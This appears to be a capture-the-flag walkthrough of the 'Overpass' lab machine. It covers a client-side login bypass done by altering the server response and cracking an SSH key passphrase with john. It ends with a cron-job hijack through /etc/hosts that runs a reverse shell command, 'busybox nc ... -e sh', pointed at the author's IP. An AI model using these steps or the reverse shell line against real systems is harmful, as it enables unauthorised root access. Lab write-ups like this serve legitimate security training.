# Overpass

### Overpass
Nmap scan shows ports 22 and 80 open. 
The website allows you to download a password manager. I found a comment in the source code: <br />
![image](https://github.com/user-attachments/assets/09cc9433-cad8-4f1d-a7c2-cd2594ceae2e)<br />
I believe this has something to do with the caesar cipher. Inside the `/downloads` directory there's the source code of the password manager written in Go. I confirm that this is just running ROT47 to "encrypt" the passwords: <br />
![image](https://github.com/user-attachments/assets/740371b8-b745-4bdf-8625-ed6e0469595b)<br />
Furthermore, I found a comment: <br />
![image](https://github.com/user-attachments/assets/b1867382-9eb2-4109-bf95-a11e6ca1b7c2)<br />
Maybe `steve` is a username. Further enumeration of the machine finds `/admin` directory with a login panel.
I tried some bruteforce with hydra but nothing. Looking around the source code I also noted an interesting file called `login.js`: <br />
![image](https://github.com/user-attachments/assets/d0c2b9e2-03f9-47d2-9604-f9cc987c0fb8)<br />
This is the main login function. Based on the credentials we provide, this script will wait for the server response. If the server response is "Incorrect credentials", then authentication fails. But if the server response is not "Incorrect credentials" then it will create a token with the response of the server, and then redirects me to `/admin`. <br />
This code is vulnerable because if I'm able to intercept the server response and modify it to something different than "Incorrect credentials", then the else clause will execute and I will generate a cookie and redirect to `/admin`. <br />
If the server doesn't really check the validity of the cookie then this works. Let's try it: <br />
![image](https://github.com/user-attachments/assets/98f69ba3-f75b-4db4-a29a-fd350cd63ffc)<br />
First intercept the request, then right click on it to enable the interception of the response. Next, modify the response with something random: <br />
![image](https://github.com/user-attachments/assets/2ee139c7-e766-4351-8511-2f486cc9e838)<br />
This gives me access to the admin panel, that contains a private ssh key: <br />
![image](https://github.com/user-attachments/assets/545e9969-8998-45b9-8567-37d118d3143f)<br />
To find the passphrase for james' ssh key, run:

    ssh2john id_rsa_james > hash
    john hash --wordlist=/usr/share/wordlists/rockyou.txt

Now I can login with 

    chmod 600 id_rsa_james
    ssh -i id_rsa_james james@10.10.54.27

Time to privesc. James also uses this overpass software: <br />
![image](https://github.com/user-attachments/assets/6a34c686-52c5-431b-a1b8-9e32fd5220af)<br />
The .overpass file contains a password: <br />
![image](https://github.com/user-attachments/assets/fdc05f68-b87c-4ea9-aec9-ccc6de463d26)<br />
Since I know that this "encryption" is using ROT47, I can find the password using [cyberchef](https://gchq.github.io/CyberChef/). I found james password, but I don't really need it since I'm already logged in. However if I check the cronjobs: <br />
![image](https://github.com/user-attachments/assets/32b4aaef-49c4-4cb4-afdf-aef94380467e)<br /> 
If I check what this script is doing: <br />
![image](https://github.com/user-attachments/assets/1fe9f241-2680-4599-8912-da26c19ad086)<br />
I want to focus on this line `echo "$(date -R) Builds completed" >> /root/buildStatus`. What it comes to my mind is that I might be able to somehow change the output of the `date -R` command, so that root executes a reverse shell.<br />
After studying this topic for a bit,  I realized it's not possible to change what the `date` command displays unless you are already root. So I runned linpeas to check for more stuff and here's an interesting result: <br />
![image](https://github.com/user-attachments/assets/460e1c79-169f-4ea8-8e61-18ffcda762ca)<br />
I have write access to the `/etc/hosts` file. This means that I can modify it so that `overpass.thm` actually points to MY IP address instead of the real one. So if I set a python web server, and then I create a file in `/downloads/src/buildscript.sh` containing a reverse shell, I expect it to work. Let's try it. <br />
First, I modify the `/etc/hosts` file: <br />
![image](https://github.com/user-attachments/assets/36d21002-3b7f-45ee-8147-d497be6520dd)<br />
Next I create a file `/downloads/src/buildscript.sh` with the following code: `busybox nc 10.11.85.53 9001 -e sh`. After a few seconds, I have a reverse shell as root: <br />
![image](https://github.com/user-attachments/assets/1dcec18b-623e-4584-a714-319b2ce3f30c)<br />








